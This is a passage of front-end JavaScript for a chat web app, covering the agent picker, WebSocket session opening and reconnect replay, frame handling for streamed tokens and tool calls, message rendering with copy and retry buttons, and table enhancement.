      a => a.mine && a.slug && (a.status === "ready" || a.is_default)
    );
  } catch (err) {
    console.warn("chat: could not load agents for the picker", err);
  }
}

/** Fetch the agent list and wire the button. Best-effort: any failure leaves
 * the composer exactly as it is today (brand label, no menu), because being
 * unable to LIST agents must not block chatting with the default one. */
async function initAgentPicker() {
  const btn = $("chat-agent-btn");
  const menu = $("chat-agent-menu");
  if (!btn || !menu) return;
  btn.addEventListener("click", (e) => {
    e.stopPropagation();
    if (_sessionHasTurns) return;
    if (menu.hidden) {
      // Paint from cache first (no open-delay), then reconcile. The list goes
      // stale in one ordinary way: the DEFAULT agent row is seeded lazily, on
      // the owner's first session — so a boot-time fetch on a fresh account
      // misses it, and without this refresh someone who switched to a named
      // agent would have no way back to their default except "+ New chat".
      _renderAgentMenu();
      menu.hidden = false;
      btn.classList.add("is-open");
      btn.setAttribute("aria-expanded", "true");
      _refreshAgents().then(() => {
        if (!menu.hidden) _renderAgentMenu();
        _syncAgentPicker();
      });
    } else {
      _closeAgentMenu();
    }
  });
  document.addEventListener("click", (e) => {
    if (menu.hidden) return;
    if (!menu.contains(e.target) && e.target !== btn) _closeAgentMenu();
  });
  document.addEventListener("keydown", (e) => {
    if (e.key === "Escape" && !menu.hidden) { _closeAgentMenu(); btn.focus(); }
  });
  _agentsLoaded = _refreshAgents();
  await _agentsLoaded;
  _syncAgentPicker();
}

async function newChat(agentSlug) {
  const body = { surface: "web" };
  if (agentSlug) body.agent_slug = agentSlug;
  const created = await api("/api/chat/sessions", {
    method: "POST",
    body: JSON.stringify(body),
  });
  // Reset the thread title — a brand-new session has no real title
  // yet, so the empty-state should show the capability panel and not
  // a stale label from the previous conversation.
  setThreadTitle(null);
  await loadSidebar();
  openSession(created.id, created.ws_url);
}

/** Fetch persisted history for ``chatId`` and render it into
 * #chat-messages (or show the capability/intro panel if there is none
 * yet). Shared by openSession's initial hydrate and the ``full_refresh``
 * reconnect path (wave-2F task 3, see handleFrame) — the server sends
 * ``full_refresh`` when it can't confidently replay everything since our
 * last-seen seq (coordination-backend reset, or the replay stream's
 * MAXLEN evicted past our watermark), and reloading from REST is exactly
 * what openSession already does on first open, so this is just that
 * logic made callable a second time. */
async function loadAndRenderHistory(chatId) {
  $("chat-messages").innerHTML = "";
  // Reset recall state for the chat being loaded up front, not after a
  // successful fetch — a failed fetch must not leave ArrowUp/ArrowDown
  // browsing the PREVIOUS conversation's prompts under the new chatId.
  _promptHistory = [];
  _historyPos = 0;
  _historyDraft = "";
  _historyBrowsing = false;
  let history = [];
  try {
    history = await api(`/api/chat/sessions/${chatId}/messages`);
  } catch (err) {
    setStatus(`Could not load history: ${err.message}`, "warn");
    return;
  }
  if (history.length === 0) {
    // A conversation with an agent opens with that agent introducing itself —
    // the `greeting` its owner authored in the builder (agents.greeting, v110),
    // which until now was only ever shown in the builder's preview bubble.
    // Rendered client-side and never persisted: generating a hello through the
    // model would force a sandbox spawn and burn a turn before the user
    // has typed anything, and the whole point of an authored greeting is that
    // the words already exist. Re-rendered on every open of a still-empty
    // session, so a reload before the first message keeps it.
    await _agentsLoaded;
    const agent = _agentById(_currentAgentId);
    if (agent && agent.greeting) {
      hideCapabilities();
      renderMessage({ role: "assistant", content: agent.greeting });
    } else {
      showCapabilities();
    }
  } else {
    hideCapabilities();
    _markConversationStarted();
    lastAssistantArticle = null;
    lastUserText = "";
    for (const m of history) {
      renderMessage(m);
      if (m.role === "user") {
        lastUserText = m.content || "";
        // Recall is "this conversation's own sent messages" — a co-drive
        // peer's prompt (sender_email set and not ours) must not surface
        // under MY ArrowUp, matching submitUserMessage's live-send path,
        // which only ever appends the local sender's own text and skips a
        // repeat of the immediately preceding entry (same reason here: a
        // reload/full_refresh must rebuild the identical recall stack a
        // live session would have ended up with, not re-materialize
        // duplicates the live path would have collapsed).
        if (
          (!m.sender_email || m.sender_email === currentUserEmail) &&
          _promptHistory[_promptHistory.length - 1] !== lastUserText
        ) {
          _promptHistory.push(lastUserText);
        }
      }
    }
    // A reload must end in the same state as the live turn: the follow-up
    // chips belong under the newest assistant answer — and only while it is
    // still the conversation's tail. A user message after it means the
    // conversation moved on (error-aborted turn, mid-turn full_refresh),
    // where the live path clears the chips. renderMessage stripped the
    // trailer from the DOM; re-extract it from the raw content here.
    const lastTurnMsg = [...history].reverse().find(m => m.role === "assistant" || m.role === "user");
    if (lastTurnMsg && lastTurnMsg.role === "assistant" && lastAssistantArticle) {
      renderNextActions(
        lastAssistantArticle.querySelector(".msg-bubble"),
        extractNextActions(lastTurnMsg.content || "").actions,
      );
    }
  }
  // Only _historyPos needs re-syncing here — the else branch above grew
  // _promptHistory via push(); draft/browsing were already reset up top
  // and nothing since has touched them.
  _historyPos = _promptHistory.length;
  // Re-draw any approval still waiting for an answer. The wipe above is a
  // transcript redraw, and a pending card is not transcript — without this
  // a full_refresh racing a replayed card erases it and the blocked command
  // has no way out but the timeout denial (review finding on #1145).
  for (const frame of pendingApprovalFrames.values()) {
    renderApprovalRequest(frame);
  }
  // Same rule for pending question cards (AskUserQuestion round-trip).
  for (const frame of pendingQuestionFrames.values()) {
    renderQuestionRequest(frame);
  }
}

/** Open (or resume) a chat session.
 *
 * For an existing ``chatId`` we POST ``/sessions/{id}/ticket`` to mint a
 * fresh WS ticket against the SAME session — preserves ``chat_id``,
 * history context, message threading. (``POST /sessions`` creates a NEW
 * session each time, which used to be the path here and caused "click
 * on old chat shows old history but routes new messages to a brand-new
 * session" confusion.)
 */
async function openSession(chatId, wsUrlOverride) {
  if (ws) { ws.close(); ws = null; }
  // The streaming pointers belong to the conversation being left: without
  // this, a pending 150 ms tick paints into a node the wipe below detaches,
  // and a token arriving on the new socket (no submit in between) appends
  // the OLD conversation's accumulated text into an invisible bubble.
  _resetStreamingState();
  // Unanswered cards belong to the conversation that raised them: this map
  // is re-drawn after every transcript reload, so carrying it across a
  // switch painted one conversation's card into another, where its buttons
  // did nothing (review finding on #1145). The server replays the pending
  // cards for whichever session we attach to, so dropping them here loses
  // nothing.
  pendingApprovalFrames.clear();
  answeredApprovalIds.clear();
  pendingQuestionFrames.clear();
  answeredQuestionIds.clear();
  // Are we ATTACHING to a different conversation, or re-opening this one? Not
  // the same thing: submitUserMessage -> ensureWsReady re-enters openSession
  // for the CURRENT session whenever the socket is closed, so treating every
  // open as a fresh conversation re-enabled the agent picker one tick after
  // the first message disabled it.
  const _switchingSession = currentChatId !== chatId;
  currentChatId = chatId;
  markActiveSidebar(chatId);
  // The session-files drawer keeps per-conversation state — the count badge,
  // the rendered rows (whose download links carry a chat id), and the
  // baseline of deliverables the auto-open compares against. Nothing else
  // told it the conversation changed, so it kept announcing the previous
  // chat's numbers until a turn landed here, and it had to guess its own
  // baseline lazily on the first turn-end — too late to notice that turn's
  // own deliverable. This is the only place a non-null currentChatId is
  // assigned, so it is the one honest signal. Fired for a re-open too: a
  // reconnect is not a new conversation, but the listing may have moved on.
  document.dispatchEvent(
    new CustomEvent("agnes:session-open", { detail: { chatId, switching: _switchingSession } })
  );
  // Sidebar cache holds the title — look it up so the header reads
  // correctly the moment the session opens, before history hydrates.
  const meta = _sessionsCache.find(s => s.id === chatId);
  // A titled session is necessarily one with turns (titles are derived from
  // the conversation), so it can raise its header right away, before history
  // hydrates. An UNTITLED one cannot be judged yet — it is equally a thread
  // whose title never landed and a session created a moment ago by the agent
  // picker — so the chrome waits for `loadAndRenderHistory` to say which.
  setThreadTitle(meta && meta.title ? meta.title : null);
  // Who this conversation runs as. Read from the sidebar row (agent_id is
  // projected by GET /api/chat/sessions) rather than a per-open round-trip;
  // newChat() refreshes that cache before calling us, so a just-created
  // session is present too. Set BEFORE loadAndRenderHistory so the empty-
  // transcript branch can render the agent's greeting.
  _currentAgentId = (meta && meta.agent_id) || null;
  // Only a genuinely different conversation starts out "no turns yet";
  // loadAndRenderHistory raises the flag again if this one has messages.
  if (_switchingSession) _sessionHasTurns = false;
  _syncAgentPicker();
  setStatus("");

  // Hydrate history. Show the capability/intro panel only when this
  // session has no messages yet — otherwise the chat-main area is a
  // blank rectangle and the user has no visual guidance about what
  // they can ask.
  await loadAndRenderHistory(chatId);

  // Mint a fresh WS ticket for THIS chat_id (unless caller already has one).
  let wsUrl = wsUrlOverride;
  if (!wsUrl) {
    try {
      const t = await api(`/api/chat/sessions/${chatId}/ticket`, { method: "POST" });
      wsUrl = t.ws_url;
    } catch (err) {
      setStatus(`Could not resume chat: ${err.message}`, "error");
      return;
    }
  }

  // Reconnect replay (wave-2F task 3): tell the server the highest seq we
  // already saw for this chat so it can resend anything we missed (or
  // signal full_refresh) before resuming live delivery. Omitted/0 for a
  // chat we've never received a frame for yet — see
  // app.chat.replay.replay_since for why that's the correct no-op case,
  // not a gap.
  const lastSeq = lastSeenSeqByChat.get(chatId);
  if (typeof lastSeq === "number" && lastSeq > 0) {
    wsUrl += (wsUrl.includes("?") ? "&" : "?") + `last_seq=${lastSeq}`;
  }

  const proto = location.protocol === "https:" ? "wss" : "ws";
  resetServerReady();
  // Show a "Resuming session…" status immediately after the TCP handshake and
  // before the ready frame arrives. For a fresh spawn this reads as a brief
  // connecting state; for a paused session (~1–2 s resume) it tells the user
  // something is happening. The ready frame handler clears it — connected is
  // the normal state and gets no pill.
  setStatus("Resuming session…", "info");
  ws = new WebSocket(`${proto}://${location.host}${wsUrl}`);
  ws.onmessage = (ev) => handleFrame(JSON.parse(ev.data));
  ws.onclose = () => {
    setStatus("Disconnected — click the conversation again to resume.", "warn");
    // Re-arm so the next openSession starts with an unresolved promise;
    // resolveServerReady is replaced fresh in resetServerReady().
    resetServerReady();
  };
}

function handleFrame(frame) {
  // Track last-seen seq per session (wave-2F task 2/3 — see
  // lastSeenSeqByChat above). Additive/back-compat: a frame with no `seq`
  // (rollout window, or a frame kind the server doesn't stamp) just isn't
  // tracked — every other code path below is unaffected either way.
  //
  // Dedup guard (wave-2F task 3): a frame whose seq is <= the highest
  // we've already applied is a duplicate we must NOT re-render — it would
  // double-append a token, re-fire a tool-call-start, etc. This can
  // legitimately happen at the seam between the reconnect replay stream
  // and the manager's own mid-turn turn_buffer resend (both can cover the
  // same in-flight turn), so silently dropping is the correct behavior,
  // not a bug signal.
  if (currentChatId && typeof frame.seq === "number") {
    const seen = lastSeenSeqByChat.get(currentChatId);
    const alreadySeen = seen !== undefined && frame.seq <= seen;
    // Approval frames are exempt: a reconnect wipes and re-draws the
    // conversation, so dropping the re-sent request would leave the user
    // with no Allow/Deny buttons and the command stalled until the gate's
    // own timeout denies it. Both handlers are keyed by request_id and
    // already no-op on a card that exists / is gone, so re-delivery cannot
    // double-render (review finding on #1145).
    if (alreadySeen && !REPLAYABLE_FRAME_TYPES.has(frame.type)) {
      return;
    }
    if (!alreadySeen) {
      lastSeenSeqByChat.set(currentChatId, frame.seq);
    }
  }
  switch (frame.type) {
    case "ready":
    case "runner_ready":
      // Connected is the NORMAL state — showing a permanent "Connected."
      // pill told the user about infrastructure they never asked about
      // (and reconnection is automatic anyway). Clear the transient
      // "Resuming session…" line instead; the status surfaces only when
      // something is wrong (warn/error) or in progress (info).
      setStatus("");
      // Unblock any in-flight ``submitUserMessage`` that's awaiting the
      // server's confirmation that the runner is alive. Two frames fire
      // (``ready`` once after WS open, ``runner_ready`` after subprocess
      // boot) but the first one is enough — manager.attach has populated
      // self._live by the time ``ready`` goes out.
      if (resolveServerReady) resolveServerReady();
      break;
    case "token":
      appendToken(frame.text);
      break;
    case "tool_call":
      // Data-app preview/refresh/close/credentials tools drive the split
      // pane instead of the generic "running…" tool block — suppress the
      // usual start-render for them (see handlePreviewDirective below), and
      // remember the call id so the result frame (which carries no tool name)
      // can be recognized as a preview result.
      if (_isPreviewTool(frame.tool)) {
        if (frame.tool_use_id) _previewToolCallIds.set(frame.tool_use_id, _bareToolName(frame.tool));
        clearThinkingPlaceholder();
        break;
      }
      if (frame.tool === "AskUserQuestion") {
        // The question card (question_request frame) IS this tool's UI —
        // the generic "running…" block would just duplicate it. Its
        // tool_result no-ops in renderToolCallEnd (no card was started).
        clearThinkingPlaceholder();
        break;
      }
      renderToolCallStart(frame);
      break;
    case "tool_result": {
      // MCP tool results arrive as a list of text blocks that the runner
      // collapses into a joined string (runner._emit_tool_result), so the
      // directive is often a JSON *string*, not a parsed object — parse it.
      let result = frame.result;
      if (typeof result === "string") {
        try {
          result = JSON.parse(result);
        } catch (_e) {
          /* not JSON — leave as the original string */
        }
      }
      if (_isPreviewDirective(result)) {
        handlePreviewDirective(result);
        if (frame.tool_use_id) _previewToolCallIds.delete(frame.tool_use_id);
        break;
      }
      // A preview tool whose result isn't a directive (a raised error, or the
      // friendly `data_apps_disabled` payload) — matched by the tracked call id
      // (tool_result's `frame.tool` is the id, not the name). Without this the
      // pane spinner runs forever (its tool_call start was suppressed, so
      // renderToolCallEnd has no card to finish).
      if (frame.tool_use_id && _previewToolCallIds.has(frame.tool_use_id)) {
        const erroredTool = _previewToolCallIds.get(frame.tool_use_id);
        _previewToolCallIds.delete(frame.tool_use_id);
        // Route by WHICH tool errored, not merely whether a pane is open:
        // the credentials tool drives no pane, so its failure must render
        // inline — otherwise it would clobber a live preview the user is
        // watching (pane placeholder re-shown, iframe hidden).
        if (erroredTool !== "agnes_data_app_credentials" && previewPaneEl) {
          _previewPaneError(result);
        } else {
          _renderPreviewToolError(result);
        }
        break;
      }
      renderToolCallEnd(frame);
      break;
    }
    case "assistant_message":
      finalizeAssistantMessage(frame);
      break;
    case "session_renamed":
      applySessionRename(frame);
      break;
    case "approval_request":
      renderApprovalRequest(frame);
      break;
    case "approval_resolved":
      resolveApprovalCard(frame);
      break;
    case "question_request":
      renderQuestionRequest(frame);
      break;
    case "question_resolved":
      resolveQuestionCard(frame);
      break;
    // The terminal frames below all disarm the long-run notification nudge —
    // a turn that has stopped is no longer worth offering to be pinged about
    // — and collapse this turn's tool-call cards down to their header line.
    case "cancelled":
      _flushStreamingTail();
      renderSystemNote("Turn cancelled.", "warn");
      setStatus(`Cancelled tool: ${frame.tool || ""}`, "warn");
      $("cancel-btn").hidden = true;
      clearThinkingPlaceholder();
      onboardingNoteTurnEnded();
      _collapseFinishedToolCalls();
      break;
    case "confirmation_required":
      // The runner stopped the turn at the per-turn tool budget — often no
      // assistant_message follows, so without this note the turn just froze
      // with zero explanation (the frame used to be silently dropped).
      _flushStreamingTail();
      renderSystemNote(
        `Stopped early: this turn hit its tool-call budget${frame.budget ? ` (${frame.budget})` : ""}. Send a message to continue where it left off.`,
        "warn",
      );
      setStatus("Tool budget reached.", "warn");
      $("cancel-btn").hidden = true;
      clearThinkingPlaceholder();
      onboardingNoteTurnEnded();
      _collapseFinishedToolCalls();
      break;
    case "error":
      _flushStreamingTail();
      renderSystemNote(
        `Something went wrong: ${frame.kind || "error"}${frame.message ? ` — ${frame.message}` : ""}`,
        "error",
      );
      setStatus(`Error: ${frame.kind} (${frame.message || ""})`, "error");
      $("cancel-btn").hidden = true;
      clearThinkingPlaceholder();
      onboardingNoteTurnEnded();
      _collapseFinishedToolCalls();
      break;
    case "done":
      // A turn that stopped without ever finalizing (interrupt surfaced as
      // an exception — no trailing assistant_message) must not leave the
      // stream pointers armed, or the next turn appends into this bubble.
      _resetStreamingState();
      $("cancel-btn").hidden = true;
      onboardingNoteTurnEnded();
      _collapseFinishedToolCalls();
      // The session-files block listens for this to refresh its count and to
      // surface a deliverable the turn just wrote (see §6). A CustomEvent
      // rather than a direct call: that block is a separate IIFE with no
      // exported handle, and the frame switch should not grow a dependency
      // on it.
      document.dispatchEvent(new CustomEvent("agnes:turn-end"));
      break;
    case "session_participants":
      // §5.3 Co-presence: full re-render of the participant roster.
      // Co fields are optional — an older server that never sends this frame
      // degrades gracefully (renderParticipants with empty list is a no-op).
      renderParticipants(frame.participants || []);
      break;
    case "full_refresh":
      // wave-2F task 3: the server couldn't confidently replay everything
      // since our last-seen seq (coordination-backend reset, or the
      // replay stream's MAXLEN evicted past our watermark) — reload
      // persisted history from REST instead of risking a silently
      // incomplete transcript. Drop our seq watermark for this chat too:
      // reloaded history carries no seq (see app.chat.frame_seq's
      // docstring on unstamped historical messages), so the next
      // reconnect must start fresh (last_seq omitted) rather than ask for
      // a replay window we have no way to reason about anymore.
      lastSeenSeqByChat.delete(currentChatId);
      if (currentChatId) loadAndRenderHistory(currentChatId);
      break;
  }
}

/** Apply a server-pushed title update for a session — fires when the
 *  Haiku auto-title (or any future inline rename) lands. We update:
 *
 *  - the in-memory sidebar cache so Cmd+K picks up the new title;
 *  - the sidebar <li>'s visible label + aria/title attributes;
 *  - the main-panel thread header, if the renamed session is active.
 *
 *  No-op if the frame is malformed or for a session we don't know
 *  about (e.g. the user already deleted it). */
function applySessionRename(frame) {
  const { chat_id: id, title } = frame || {};
  if (!id || !title) return;
  // Cache update — Cmd+K palette reads from here.
  const cached = _sessionsCache.find(s => s.id === id);
  if (cached) cached.title = title;
  // Live sidebar item — in either list (a pinned conversation lives in the
  // rail's Pinned section, not in #chat-list).
  const li = _sidebarRows().find(row => row.dataset.id === id);
  if (li) {
    const label = li.querySelector(".cloud-chat-list-label");
    if (label) {
      // When the sidebar is collapsed, the visible content is the
      // initial — store the new full title in data-full-title so the
      // expand-back round-trip is lossless. Otherwise just paint the
      // new title in directly.
      if (typeof isSidebarCollapsed === "function" && isSidebarCollapsed()) {
        label.dataset.fullTitle = title;
        label.textContent = _firstInitial({ title });
      } else {
        label.textContent = title;
      }
    }
    li.title = title;
    li.setAttribute("aria-label", `Open ${title}`);
    // The row menu's trigger names the conversation in its accessible label.
    // (Its menu ITEMS don't — they're generic verbs inside a panel already
    // scoped to this row — so there is nothing else here to re-label.)
    const kebab = li.querySelector(".chat-rowmenu-btn");
    if (kebab) kebab.setAttribute("aria-label", `More actions for ${title}`);
  }
  // Main-panel header.
  if (id === currentChatId) setThreadTitle(title);
}

// ---------- Bubble + avatar + actions ------------------------------------
// Each turn renders as a <article class="msg msg-<role>"> with an
// avatar, a bubble (body + optional tool details + hover actions row).
// Streaming uses the same shell — appendToken appends to the body,
// finalize re-renders it through marked.parse and attaches the
// actions row (timestamp + copy button) once the content is stable.

function userInitial() {
  const email = document.body.dataset.userEmail || "";
  return (email[0] || "?").toUpperCase();
}

function formatTime(d) {
  return d.toLocaleTimeString(undefined, { hour: "2-digit", minute: "2-digit" });
}

/** Build the empty bubble shell — avatar + bubble + body, no content
 *  yet. ``createdAt`` accepts an ISO string or a Date; falls back to
 *  ``new Date()`` for live turns. The article is NOT yet attached to
 *  the DOM. */
function createMessageShell({ role, createdAt }) {
  const article = document.createElement("article");
  article.className = `msg msg-${role}`;
  const ts = createdAt
    ? (createdAt instanceof Date ? createdAt : new Date(createdAt))
    : new Date();
  article.dataset.createdAt = ts.toISOString();

  const avatar = document.createElement("div");
  avatar.className = "msg-avatar";
  avatar.setAttribute("aria-hidden", "true");
  avatar.textContent = role === "user" ? userInitial() : "A";
  article.appendChild(avatar);

  const bubble = document.createElement("div");
  bubble.className = "msg-bubble";
  const body = document.createElement("div");
  body.className = "msg-body";
  bubble.appendChild(body);
  article.appendChild(bubble);
  return article;
}

const _COPY_ICON_SVG =
  '<svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5" aria-hidden="true">' +
  '<rect x="4.25" y="4.25" width="9" height="9" rx="1.5"/>' +
  '<path d="M2.75 11V3.25C2.75 2.7 3.2 2.25 3.75 2.25H10"/>' +
  "</svg>";

// Copy text to the clipboard, resolving true on success. The async
// Clipboard API is the preferred path but is unavailable or rejects in
// several deployed setups even over HTTPS — a restrictive
// Permissions-Policy, an <iframe> without `clipboard-write`, a
// not-fully-trusted cert behind a TLS-terminating proxy, or simply a
// browser that gates it. When it's missing or throws, fall back to a
// throwaway off-screen <textarea> + document.execCommand("copy"), which
// works synchronously from the click gesture in those contexts. Without
// this fallback the copy buttons just showed "Couldn't copy to clipboard".
async function copyTextToClipboard(text) {
  const value = text || "";
  if (navigator.clipboard && window.isSecureContext) {
    try {
      await navigator.clipboard.writeText(value);
      return true;
    } catch (_) {
      /* blocked despite a secure context — fall through to execCommand */
    }
  }
  try {
    const ta = document.createElement("textarea");
    ta.value = value;
    ta.setAttribute("readonly", "");
    // Off-screen but still rendered — execCommand("copy") can't read from a
    // display:none element, so park it out of view instead of hiding it.
    ta.style.position = "fixed";
    ta.style.top = "-9999px";
    ta.style.left = "0";
    document.body.appendChild(ta);
    const sel = document.getSelection();
    const prevRange = sel && sel.rangeCount ? sel.getRangeAt(0) : null;
    ta.select();
    ta.setSelectionRange(0, value.length);
    const ok = document.execCommand("copy");
    document.body.removeChild(ta);
    // Restore any pre-existing user selection we clobbered.
    if (prevRange && sel) {
      sel.removeAllRanges();
      sel.addRange(prevRange);
    }
    return ok;
  } catch (_) {
    return false;
  }
}

// Tracks the most recent user message text so the "↻ Ask again"
// button on the latest assistant turn can re-fire it. Updated by
// submitUserMessage() on every send.
let lastUserText = "";

// ArrowUp/ArrowDown recall of this chat's own sent messages, shell-history
// style. _promptHistory is seeded from persisted history on load/reconnect
// (loadAndRenderHistory) and appended to on every send (submitUserMessage).
// _historyPos indexes into it; _promptHistory.length means "not browsing,
// show the live draft". _historyDraft holds that draft so ArrowDown past
// the newest entry restores whatever the user was mid-typing.
let _promptHistory = [];
let _historyPos = 0;
let _historyDraft = "";
let _historyBrowsing = false;

// Tracks the most recent assistant message so the "Ask again"
// affordance + any other "latest only" UI can be moved as the
// conversation progresses. _markLatestAssistant clears the prior
// .is-latest-assistant marker before applying the new one — CSS
// hides ".msg-regenerate" outside the latest article so we don't
// have to scrub the button from old turns.
let lastAssistantArticle = null;
function _markLatestAssistant(article) {
  if (lastAssistantArticle && lastAssistantArticle !== article) {
    lastAssistantArticle.classList.remove("is-latest-assistant");
  }
  lastAssistantArticle = article;
  if (article) article.classList.add("is-latest-assistant");
}

/** Attach (or replace) the actions row on an existing message
 *  article. ``copyText`` is the raw text the copy button writes to
 *  the clipboard — usually the same markdown that built the body. */
function attachMessageActions(article, copyText) {
  const bubble = article.querySelector(".msg-bubble");
  if (!bubble) return;
  const existing = bubble.querySelector(".msg-actions");
  if (existing) existing.remove();

  const wrap = document.createElement("div");
  wrap.className = "msg-actions";

  const ts = article.dataset.createdAt
    ? new Date(article.dataset.createdAt)
    : new Date();
  const time = document.createElement("time");
  time.className = "msg-time";
  time.dateTime = ts.toISOString();
  time.textContent = formatTime(ts);
  time.title = ts.toLocaleString();
  wrap.appendChild(time);

  const copy = document.createElement("button");
  copy.type = "button";
  copy.className = "msg-copy";
  copy.title = "Copy message";
  copy.setAttribute("aria-label", "Copy message");
  copy.innerHTML = _COPY_ICON_SVG;
  copy.onclick = async (e) => {
    e.stopPropagation();
    if (await copyTextToClipboard(copyText || "")) {
      copy.classList.add("is-copied");
      setTimeout(() => copy.classList.remove("is-copied"), 1400);
      showToast("Message copied", "ok");
    } else {
      showToast("Couldn't copy to clipboard", "error");
    }
  };
  wrap.appendChild(copy);

  // "↻ Ask again" — only meaningful on assistant turns; CSS keeps
  // it hidden on every assistant message except .is-latest-assistant
  // so the user sees one button at a time at the bottom of the
  // thread (ChatGPT pattern). Re-fires lastUserText via the same
  // submitUserMessage path so streaming, status, and toast logic
  // all run identically.
  if (article.classList.contains("msg-assistant")) {
    const regen = document.createElement("button");
    regen.type = "button";
    regen.className = "msg-regenerate";
    regen.title = "Ask the same question again";
    regen.setAttribute("aria-label", "Ask the same question again");
    regen.innerHTML =
      '<svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">' +
      '<path d="M2 8a6 6 0 1 1 1.76 4.24"/>' +
      '<path d="M2 12V8h4"/>' +
      "</svg>" +
      '<span>Ask again</span>';
    regen.onclick = (e) => {
      e.stopPropagation();
      if (!lastUserText) return;
      submitUserMessage(lastUserText);
    };
    wrap.appendChild(regen);
  }

  bubble.appendChild(wrap);
}

/** A message from history.
 *
 *  An assistant turn is a SEQUENCE — prose, a tool call, more prose about what
 *  came back — and `m.parts` is that sequence (schema v123, see
 *  app/chat/message_parts.py). This walks it in ORDER and emits one node per
 *  part, so a reload puts every tool card back where it actually ran (#1504).
 *
 *  Nothing is hoisted. An earlier version painted the first TEXT part into the
 *  message bubble regardless of its position, which silently reversed a turn
 *  that OPENS with a tool call (an agent calling a tool before saying
 *  anything): the prose came out above the card that ran first, while the live
 *  stream renders card-then-text for the same turn. Order is array order, and
 *  the only way to guarantee that is to never reorder.
 *
 *  The first text bubble is the PRIMARY article — it owns the avatar and the
 *  sender attribution. The turn's LAST text bubble carries the tail: sources
 *  chips, the copy/actions row, latest-assistant marking and the collapse cap
 *  — exactly where finalizeAssistantMessage puts them on the live turn, so a
 *  reload doesn't move the copy row from the end of the answer to the middle.
 *  Text parts between the two are continuation bubbles under the card above
 *  them, which is what a sealed live segment looks like.
 *
 *  A row written before v123 has no `parts`; it falls back to `content` plus
 *  the positionless `tool_calls` after it. That is not a degraded choice but
 *  the only honest one — the ordering those rows lost is not in the data, and
 *  placing cards by guess would show tool calls where they never ran.
 */
function renderMessage(m) {
  const parts = Array.isArray(m.parts) && m.parts.length ? m.parts : null;
  //: DOM nodes in the order they will be appended. Built first, appended
  //: after, so the collapse cap can measure a node that is already in the
  //: document.
  const nodes = [];
  let primary = null;
  let tailArticle = null;

  const pushTextBubble = (text) => {
    // Every shell gets the row's created_at: whichever bubble ends up
    // carrying the actions row reads its timestamp from dataset.createdAt,
    // and the tail of a segmented turn is a continuation, not the primary.
    const article = createMessageShell({ role: m.role, createdAt: m.created_at });
    const body = article.querySelector(".msg-body");
    body.innerHTML = renderAnswerMarkdown(text || "");
    enhanceCodeBlocks(body);
    enhanceTables(body);
    renderMermaidBlocks(body);
    if (primary === null) {
      primary = article;
    } else {
      // A continuation is the same speaker mid-answer: no second avatar.
      article.classList.add("is-continuation");
    }
    tailArticle = article;
    nodes.push(article);
    return article;
  };

  if (!parts) {
    pushTextBubble(m.content);
    for (const tc of (m.tool_calls && m.tool_calls.length ? m.tool_calls : [])) {
      // A row can carry no `tool` name at all — the cancelled/interrupted
      // markers manager.py stores in place of a real call. Rendering those
      // unconditionally produced `tool: undefined` and an empty fence.
      if (!formatToolCall(tc)) continue;
      nodes.push(_buildToolCard({ tool: tc.tool, args: tc.args || {}, status: "replayed" }));
    }
  } else {
    for (const part of parts) {
      if (!part) continue;
      if (part.type === "text") {
        pushTextBubble(part.text);
        continue;
      }
      if (part.type === "tool" && part.tool) {
        nodes.push(
          _buildToolCard({
            tool: part.tool,
            args: part.args || {},
            // The persisted state IS the outcome, so a replayed card no
            // longer has to omit the icon and edge to avoid claiming one.
            status: "replayed",
            state: part.state,
            result: Object.prototype.hasOwnProperty.call(part, "result") ? part.result : undefined,
            isError: part.is_error === true,
          }),
        );
      }
    }
    // Degenerate row: tools but no text at all. The message still needs a
    // primary article to carry the copy row — appended LAST so the cards keep
    // the positions they actually had.
    if (primary === null) pushTextBubble(m.content);
  }

  const bubble = primary.querySelector(".msg-bubble");

  // §5.3 Co-presence: per-message sender attribution for foreign senders.
  // sender_email is an optional co-drive field — single-user sessions never
  // populate it, so this is a no-op for ordinary sessions.
  if (m.sender_email && m.sender_email !== currentUserEmail) {
    const who = document.createElement("div");
    who.className = "msg-sender-attr";
    who.textContent = m.sender_email;
    who.style.cssText = "font-size:var(--ds-text-xs,0.75rem);color:var(--ds-text-secondary);margin-bottom:2px;";
    bubble.insertBefore(who, bubble.querySelector(".msg-body"));
  }

  // Chips and the actions row belong to the turn's LAST bubble — where the
  // live path (finalizeAssistantMessage) puts them — so they read as the end
  // of the answer on reload too, not a tail stapled after its first segment.
  const tailBubble = tailArticle.querySelector(".msg-bubble");
  if (m.role === "assistant") renderSourcesChips(tailBubble, m.sources);

  // Copy keeps the sources fence — provenance is record, hidden from the eye
  // only (see the note on stripSourcesFence) — but drops the next_actions
  // trailer: suggestions are chrome, and a copied transcript loses nothing
  // without them. It carries the WHOLE answer, not just this bubble's segment.
  attachMessageActions(tailArticle, stripNextActionsFence(m.content || ""));

  for (const node of nodes) $("chat-messages").appendChild(node);
  if (m.role === "assistant") _markLatestAssistant(tailArticle);
  // Measured after insertion, and against the tail article only: the cards
  // and earlier segments are siblings, not part of the answer's height —
  // same as the live turn, which caps only its final segment.
  maybeMakeCollapsible(tailArticle);
  maybeScrollToBottom();
}

// ---------- Result table enhancement -------------------------------------
// marked.parse() produces a vanilla <table> for every markdown table
// the agent writes. We post-process: wrap in a horizontal-scroll
// container so wide tables don't blow up the bubble width, mark the
// table so chat.css applies the sticky-header styling, and add a
// click-to-sort handler on each <th>.
//
// Sort is column-local: clicking cycles between asc / desc, with the
// other <th>s reset. Numeric columns are sorted as numbers (parsed
// from the cell's text); everything else falls back to a
// localeCompare so accented strings sort correctly. aria-sort + a
// visual indicator (↑/↓) mirror the state so screen readers and
// sighted users agree on what's sorted.

function enhanceTables(root) {
  if (!root) return;
  for (const table of root.querySelectorAll("table")) {
    if (table.dataset.tblEnhanced === "1") continue;
    table.dataset.tblEnhanced = "1";
    // ``.ds-table`` is the canonical Agnes table family (sticky header,
    // surface-dim row hover, tabular-nums, --text-xs UPPERCASE header
    // type per system.md). The ``.cloud-chat-table`` class only
    // forwards the sort-arrow + click-to-sort styling on top.
    table.classList.add("ds-table", "cloud-chat-table");

    // Wrap for horizontal scroll on narrow viewports.
    if (!table.parentElement.classList.contains("cloud-chat-table-wrap")) {
      const wrap = document.createElement("div");
      wrap.className = "cloud-chat-table-wrap";
      table.parentNode.insertBefore(wrap, table);
      wrap.appendChild(table);
    }

    const thead = table.querySelector("thead");
    const tbody = table.querySelector("tbody");
    if (!thead || !tbody) continue;

